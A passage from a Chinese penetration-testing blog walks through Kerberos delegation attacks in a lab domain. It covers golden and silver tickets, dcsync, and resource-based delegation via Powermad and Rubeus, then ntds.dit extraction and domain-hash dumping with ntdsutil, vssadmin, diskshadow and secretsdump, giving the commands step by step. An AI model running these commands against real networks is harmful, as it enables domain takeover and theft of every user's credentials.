spooler</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104502.png"></p><p>然后开启监听（需要管理员权限的cmd），执行exp，会捕捉到域控机器账户的TGT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe monitor /interval:1 /filteruser:dc$     </span><br><span class="line">SpoolSample.exe dc win2008</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104510.png"></p><p>利用powershell转换成kirbi格式再mimikatz导入内存（注意清除TGT数据中多余的换行符）。由于获取的是域控机器账户权限，无法直接连接域控。可以先获取krbtgt的hash，然后制造金票连接域控。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;C:\Users\testuser2\Desktop\1.kirbi&quot;, [<span class="keyword">Convert</span>]::FromBase64String(&quot;base64的TGT&quot;))</span><br><span class="line">kerberos::ptt <span class="number">1.</span>kirbi</span><br><span class="line">lsadump::dcsync <span class="operator">/</span>domain:holy.testA <span class="operator">/</span><span class="keyword">all</span> <span class="operator">/</span>csv</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104520.png"></p><p>或者直接用Rubeus注入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe ptt /ticket:&lt;TGT 数据&gt;</span><br></pre></td></tr></table></figure><p>之前获取了krbtgt的hash，再加上域SID即可构造金票，连接域控。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::golden /user:administrator /domain:holy.testA /sid:S-1-5-21-2288155968-3585056588-2606465096 /krbtgt:985293xxxxxxxxxxxxxxxxx459eb12 /ticket:administrator.ticket.bin /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104530.png"></p><h1 id="约束性委派"><a href="#约束性委派" class="headerlink" title="约束性委派"></a><strong>约束性委派</strong></h1><ol><li>更安全的委派，增加了两个协议：S4U2SELF、S4U2PROXY，并且限制被设置委派的服务仅能访问指定的服务。服务账号只能获得用户的ST，仅能访问指定服务。</li><li>在服务A上配置到服务B的委派，正向的，配置需要SeEnableDelegation特权，通常仅域管理员有。</li><li>开启委派后在该用户的ACL属性中会包含：TRUSTED_TO_AUTH_FOR_DELEGATION，且msDS-AllowedToDelegateTo属性会指向委派目标服务B。</li></ol><p>大概流程：</p><ol><li>（无S4U2SELF参与）用户访问服务A向KDC提交认证，在TGS_REQ阶段KDC将可转发票据ST1传递给用户，用户拿着ST1访问服务A，服务A再通过S4U2PROXY协议将ST1发送给KDC，KDC向服务A返回ST2，最后服务A代表用户使用ST2访问指定服务。</li><li>（有S4U2SELF参与）若用户未通过kerberos协议（其他认证协议如NTLM、表单等）获取服务A信任，因此服务A并没收到用户发的ST1。服务A会以自己的hash向KDC申请一个TGT，并以任意用户身份通过S4U2SELF协议使用该TGT向KDC申请针对服务A的ST1，然后走S4U2PROXY协议流程即可。一般的攻击场景就是这样。</li></ol><p>开启方式：</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401104610.png"></p><p>cifs为被允许委派到的服务。</p><h2 id="约束性委派攻击"><a href="#约束性委派攻击" class="headerlink" title="约束性委派攻击"></a><strong>约束性委派攻击</strong></h2><p>环境：</p><ul><li>DC：172.16.1.6   server 2012</li><li>域管账户：administrator</li><li>成员机：172.16.1.11     server 2008     </li><li>域普通账户：testuser2    约束性委派服务账户</li></ul><p>思路：</p><ol><li>查询开启约束性委派的账户，查看被委派的服务。</li><li>得到该账户的NTLM HASH或者明文密码，且获得任意一台域内主机权限。</li><li>申请TGT，请求ST，随后访问指定服务。</li></ol><p>查看约束性委派账户。</p><p>powerview。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\powerview.ps1</span><br><span class="line">Get-domainuser -TrustedToAuth -domain holy.testA | select name    服务账户</span><br><span class="line">Get-domainUser -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto| fl</span><br><span class="line">Get-domaincomputer -TrustedToAuth -domain holy.testA |select name       机器账户</span><br><span class="line">Get-DomainComputer -TrustedToAuth -Properties distinguishedname,useraccountcontrol,msds-allowedtodelegateto|ft -Wrap -AutoSize</span><br></pre></td></tr></table></figure><p>以服务账户为例，先给域普通用户注册一个服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A test/win7.holy.testA testuser2</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401105331.png"></p><p>然后将它委派。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401105339.png"></p><p>此时得到了任意一台域内主机win2008的权限，且得到了testuser2约束性委派账户的密码。即可利用kekeo攻击，不需要本地管理员权限。</p><p>ps：在密码和NTLM Hash都不知道的情况下，但拥有服务账号所在主机的权限，可以利用mimikatz从内存中将票据导出来，然后再执行 。</p><p>服务A会以自己的身份testuser2向KDC申请一个TGT。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:testuser2 /domain:holy.testA /password:qwe123@   此处/password可替换成/ntlm</span><br></pre></td></tr></table></figure><p>使用该TGT，以administrator的名义，通过S4U2SELF向KDC申请访问服务A的ST1，KDC返回ST1给testuser2，然后再以administrator的名义，利用S4U2PROXY将ST1发送给KDC申请访问DC共享服务的ST2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:生成的kirbi /user:administrator@holy.testA /service:cifs/DC.holy.testA</span><br></pre></td></tr></table></figure><p>最后注入ST2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt 生成的kirbi</span><br><span class="line">dir \\DC\c$</span><br></pre></td></tr></table></figure><p>经尝试，在我的环境中该票据仅有几分钟有效，之后仍然拒绝访问&#x3D;&#x3D;</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401105507.png"></p><h1 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a><strong>基于资源的约束性委派</strong></h1><ol><li>只能在运行Windows Server 2012或Windows Server 2012 R2及以上的域控上配置。</li><li>在服务B上配置服务A到服务B的委派，反向的，可以摆脱域控来主动设置自己可以被哪些账户委派访问。</li><li>开启委派后在该用户的ACL属性中会包含：WORKSTATION_TRUST_ACCOUNT，且msDS-AllowedToActOnBehalfOfOtherIdentity属性会指向被允许委派的服务A，需要可以配置msDS属性的域用户权限（拥有将机器加入域的用户权限）。</li><li>可以跨域。</li></ol><p>大概流程：</p><p>由于是基于资源的约束性委派，服务A没配Trust和msDS字段，KDC所返回的ST1是不可转发的，然后服务A拿着ST1向KDC申请可转发的ST2。ps：讲道理ST1不可转发是申请不到ST2的，但是居然可以。</p><h2 id="基于资源的约束性委派攻击"><a href="#基于资源的约束性委派攻击" class="headerlink" title="基于资源的约束性委派攻击"></a>基于资源的约束性委派攻击</h2><p>环境：</p><ul><li>DC：172.16.1.6   server 2012</li><li>成员机：172.16.1.11   server 2008     目标主机</li><li>域普通账户：testuser2</li><li>攻击机：win7   172.16.1.10</li></ul><p>思路：</p><ol><li>获取到域成员机器server 2008权限，上面登录着低权限域用户testuser2，不在管理员组，想要进行提权。</li><li>进行查询得知是testuser2将server 2008加入域的，具有写权限。</li><li>创建机器账户A，再配置机器账户A到server 2008基于资源的约束性委派。然后进行票据传递攻击。</li><li>最后的结果是普通域账户以域管的身份访问远程机器的服务，如CIFS等，但仅仅是本地权限的提升，并不能执行域管的其他操作。</li></ol><p>先配置testuser2对server 2008具有写权限，这样才能配置基于资源的委派。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110446.png"></p><p>验证权限是否配置正确。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -Identity testuser2 -Properties objectsid </span><br><span class="line">Get-DomainObjectAcl -Identity win2008 | ?&#123;$_.SecurityIdentifier -match &quot;S-1-5-21-2288155968-3585056588-2606465096-1109&quot;&#125;</span><br></pre></td></tr></table></figure><p>关注ActiveDirectoryRights属性，如下所示，或者为GenericAll，代表完全控制。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110501.png"></p><p>一个域用户最多创建10个机器账户，利用<a href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a> 工具。</p><p>创建一个机器用户。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount haa -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br><span class="line">net group &quot;domain computers&quot; /domain</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110510.png"></p><p>所创建的机器账户自带服务，接下来需要在server 2008上修改msDS-AllowedToActOnBehalfOfOtherIdentity属性，配置机器账户haa到server 2008的基于资源的约束性委派。</p><p><strong>利用powerview配置</strong></p><p>先查询haa的SID，配置时需要用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer haa</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110521.png"></p><p>添加配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-2288155968-3585056588-2606465096-3604)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer win2008| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110529.png"></p><p>验证添加成功否。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer win2008 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110535.png"></p><p>清除msds-allowedtoactonbehalfofotheridentity的命令如下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject win2008 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure><p><strong>利用ActiveDirectory模块配置</strong></p><p>该模块默认只在DC中安装，且只有在server 2012及以上有PrincipalsAllowedToDelegateToAccount参数，该参数指向允许对目标主机进行基于资源的约束性委派的服务A。可以把该模块的DLL文件导出后导入到目标机中。导入后就能添加了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import-module Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Set-ADComputer win2008 -PrincipalsAllowedToDelegateToAccount haa</span><br><span class="line">Get-ADComputer win2008 -Properties PrincipalsAllowedToDelegateToAccount</span><br><span class="line">Set-ADUser name -PrincipalsAllowedToDelegateToAccount haa</span><br><span class="line">Get-ADUser name -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure><p><strong>利用Rubeus攻击</strong></p><p>配置委派后就可以进行攻击了，先计算haa的hash。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe hash /user:haa /password:123456 /domain:holy.testA</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110543.png"></p><p>在win7上使用Rubeus生成银票并导入。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:haa$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /domain:holy.testA /impersonateuser:administrator /msdsspn:cifs/win2008 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110551.png"></p><p>分开执行也可以。记得处理一下换行符。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:haa$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /domain:holy.testA /msdsspn:cifs/win2008.holy.testA /impersonateuser:administrator</span><br><span class="line">Rubeus.exe ptt /ticket:票据</span><br></pre></td></tr></table></figure><p>接下来若用psexec返回shell的话必须再申请一个host服务。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:haa$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /domain:holy.testA /impersonateuser:administrator /msdsspn:cifs/win2008 /ptt</span><br><span class="line">Rubeus.exe s4u /user:haa$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /domain:holy.testA /impersonateuser:administrator /msdsspn:host/win2008 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110559.png"></p><p>还可以用winRM连接，前提目标主机开启了该功能。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe s4u /user:haa$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /domain:holy.testA /msdsspn:http/win2008 /impersonateuser:administrator /ptt</span><br><span class="line">Rubeus.exe s4u /user:haa$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /domain:holy.testA /msdsspn:wsman/win2008 /impersonateuser:administrator /ptt</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">New-PSSession -Name test -ComputerName win2008.holy.testA</span><br><span class="line">Enter-PSSession -Name test</span><br></pre></td></tr></table></figure><h2 id="敏感用户不可委派的情况"><a href="#敏感用户不可委派的情况" class="headerlink" title="敏感用户不可委派的情况"></a><strong>敏感用户不可委派的情况</strong></h2><p>将DC的administrator用户设置为敏感账户不允许委派。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110608.png"></p><p>勾选之后，申请银票时不会影响S4U2self过程，但会影响S4U2proxy过程。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110616.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe describe /ticket:票据</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110625.png"></p><p>需要将S4U2self过程生成的ST1修改，添加目标服务名称后导入，相当于完成S4U2proxy过程。</p><p>先将ST1转换成kirbi格式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;C:\Users\testuser3\Desktop\1.kirbi&quot;, [Convert]::FromBase64String(&quot;base64的TGT&quot;))</span><br></pre></td></tr></table></figure><p>导入rubeus修改后注入内存即可。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:1.kirbi /altservice:cifs/win2008 /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:1.kirbi /altservice:host/win2008 /ptt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210401110634.png"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a><strong>参考</strong></h1><p><a href="https://blog.csdn.net/qq_36119192/article/details/104538160">https://blog.csdn.net/qq_36119192/article/details/104538160</a></p><p><a href="https://www.it610.com/article/1274901337129107456.htm">https://www.it610.com/article/1274901337129107456.htm</a></p><p><a href="https://xz.aliyun.com/t/7454">https://xz.aliyun.com/t/7454</a></p>]]></content>
      
      
      <categories>
          
          <category> 内网渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 域 </tag>
            
            <tag> 票据 </tag>
            
            <tag> Kerberos </tag>
            
            <tag> 委派 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NTDS.dit及域Hash获取</title>
      <link href="/2021/02/25/a9dc5042.html"/>
      <url>/2021/02/25/a9dc5042.html</url>
      
        <content type="html"><![CDATA[<h1 id="ntds-dit提取"><a href="#ntds-dit提取" class="headerlink" title="ntds.dit提取"></a><strong>ntds.dit提取</strong></h1><h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a><strong>基础</strong></h2><p>一个二进制文件，内容包含用户名、散列值、组、GPP等与AD有关的信息。由于AD始终需要访问ntds.dit文件，文件和SAM文件一样被禁止读取，即使拥有管理员权限。可以使用windows下本地卷影拷贝服务VSS（本质属于快照技术），获得ntds.dit副本，之后便可以从中获取所有域用户hash了。</p><p>默认路径：%SystemRoot%\NTDS\ntds.dit</p><p>查看路径：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg query HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\NTDS\Parameters</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225134309.png"></p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a><strong>工具</strong></h2><h3 id="ntdsutil"><a href="#ntdsutil" class="headerlink" title="ntdsutil"></a><strong>ntdsutil</strong></h3><p>默认安装在DC中，可本地或远程执行命令，支持win2003&#x2F;2008&#x2F;2012。</p><p>在DC下创建快照。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</span><br></pre></td></tr></table></figure><p>创建了GUID为e7994c39-7949-4a96-8dd3-b575e2effe66的快照。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225134933.png"></p><p>将快照挂载到C:\$SNAP_202009191433_VOLUMEC$\下。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;mount &#123;e7994c39-7949-4a96-8dd3-b575e2effe66&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225135056.png"></p><p>将ntds.dit文件复制出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy c:\$SNAP_202009191433_VOLUMEC$\Windows\NTDS\ntds.dit c:\temp\ntds.dit</span><br></pre></td></tr></table></figure><p>将快照卸载并删除。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;unmont &#123;e7994c39-7949-4a96-8dd3-b575e2effe66&#125;&quot; &quot;delete &#123;e7994c39-7949-4a96-8dd3-b575e2effe66&#125;&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225142100.png"></p><p>查看系统快照看删除成功没有。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil snapshot &quot;List All&quot; quit quit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225142046.png"></p><h3 id="ntdsutil-IFM"><a href="#ntdsutil-IFM" class="headerlink" title="ntdsutil IFM"></a><strong>ntdsutil IFM</strong></h3><p>另一种方法：创建IFM获取ntds.dit。同时将SYSTEM和SECURITY复制到了在registry文件夹下。 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntdsutil &quot;ac i ntds&quot; ifm &quot;create full c:\users\tmp&quot; q q</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225143210.png"></p><h3 id="vssadmin"><a href="#vssadmin" class="headerlink" title="vssadmin"></a><strong>vssadmin</strong></h3><p>支持win2008和win7。</p><p>在DC中创建C盘卷影拷贝。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225143713.png"></p><p>把ntds文件复制出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy3\windows\ntds\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225143749.png"></p><p>删除快照。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225143254.png"></p><h3 id="vssown"><a href="#vssown" class="headerlink" title="vssown"></a><strong>vssown</strong></h3><p>开源脚本，需要上传，操作类似。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cscript vssown.vbs /start          启动卷影拷贝服务。</span><br><span class="line">cscript vssown.vbs /create c       在c盘创建。</span><br><span class="line">cscript vssown.vbs /list           列出卷影拷贝。</span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\ntds.dit c:\ntds.dit      复制NTDS.dit。</span><br><span class="line">cscript vssown.vbs /delete &#123;19204703-94CF-4A7B-83F7-67D387979BF6&#125;        删除卷影拷贝。</span><br></pre></td></tr></table></figure><h3 id="NISHANG"><a href="#NISHANG" class="headerlink" title="NISHANG"></a><strong>NISHANG</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Copy-VSS.ps1 </span><br><span class="line">Copy-VSS</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225144234.png"></p><h3 id="diskshadow"><a href="#diskshadow" class="headerlink" title="diskshadow"></a><strong>diskshadow</strong></h3><p>win2008&#x2F;2012&#x2F;2016自带，有交互和非交互模式两种。使用diskshadow时必须切换到windows\system32\目录下执行命令，否则会报错。</p><p>将下列命令写入一个txt文件，使用diskshadow执行这个txt。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">set context persistent nowriters </span><br><span class="line">add volume c: alias someAlias  </span><br><span class="line">create  </span><br><span class="line">expose %someAlias% z:  exec &quot;cmd.exe&quot; /c copy z:\windows\ntds\ntds.dit c:\ntds.dit  </span><br><span class="line">delete shadows all </span><br><span class="line">list shadows all  </span><br><span class="line">reset </span><br><span class="line">exit</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">diskshadow /s c:\command.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225150847.png"></p><p>导出ntds.dit后，可以将system.hive转储。因为system.hive中存放着ntds.dit的密钥，没有该密钥，将无法查看ntds.dit中的信息。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system c:\windows\temp\system.hive</span><br></pre></td></tr></table></figure><h3 id="Invoke-NinjaCopy"><a href="#Invoke-NinjaCopy" class="headerlink" title="Invoke-NinjaCopy"></a><strong>Invoke-NinjaCopy</strong></h3><p>来自PowerSploit工具包，因为没有调用VSS服务，所以不会产生日志文件7036。</p><p>从本地下载到本地。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module .\Invoke-NinjaCopy.ps1 </span><br><span class="line">Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -LocalDestination &quot;c:\ntds.dit&quot;</span><br></pre></td></tr></table></figure><p>从本地下载到远程。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -RemoteDestination &quot;c:\windows\temp\ntds.dit&quot; -ComputerName &quot;Server&quot;</span><br></pre></td></tr></table></figure><p>从远程下载到本地。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Invoke-NinjaCopy -Path &quot;c:\windows\ntds\ntds.dit&quot; -ComputerName &quot;Server&quot; -LocalDestination &quot;c:\test\ntds.dit&quot;</span><br></pre></td></tr></table></figure><h3 id="MSF"><a href="#MSF" class="headerlink" title="MSF"></a><strong>MSF</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use auxiliary/admin/smb/psexec_ntdsgrab</span><br></pre></td></tr></table></figure><p>需要设置IP、域名、SMB用户名、密码参数。然后将ntds.dit和system文件传输到&#x2F;root&#x2F;.msf4&#x2F;loot&#x2F;中。</p><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225151646.png"></p><h2 id="防范"><a href="#防范" class="headerlink" title="防范"></a><strong>防范</strong></h2><ol><li>监控卷影拷贝服务及任何涉及ntds.dit的可以操作。</li><li>监控系统事件ID：7036，以及创建vssvc.exe进程的事件。</li><li>监控创建disshadow.exe等类似进程的事件。</li><li>监控逻辑驱动器映射事件。</li></ol><h1 id="导出ntds-dit中的hash"><a href="#导出ntds-dit中的hash" class="headerlink" title="导出ntds.dit中的hash"></a><strong>导出ntds.dit中的hash</strong></h1><p>获取ntds.dit或者SYSTEM文件之后，就可以从中导出域用户的hash。</p><h2 id="工具-1"><a href="#工具-1" class="headerlink" title="工具"></a><strong>工具</strong></h2><h3 id="NTDSDumpEx"><a href="#NTDSDumpEx" class="headerlink" title="NTDSDumpEx"></a><strong>NTDSDumpEx</strong></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTDSDumpEx.exe -d ntds.dit -s SYSTEM -o domain.txt</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225151904.png"></p><h3 id="secretsdump"><a href="#secretsdump" class="headerlink" title="secretsdump"></a><strong>secretsdump</strong></h3><p>python工具包自带，impacket工具包中也有。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py -system SYSTEM -ntds ntds.dit local</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/V3teran/cloudimg@main/img/20210225152016.png"></p><p>还可以远程读取，需要域管用户账号和密码还有IP。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python3 secretsdump.py testuser:pass@@172.16.1.6 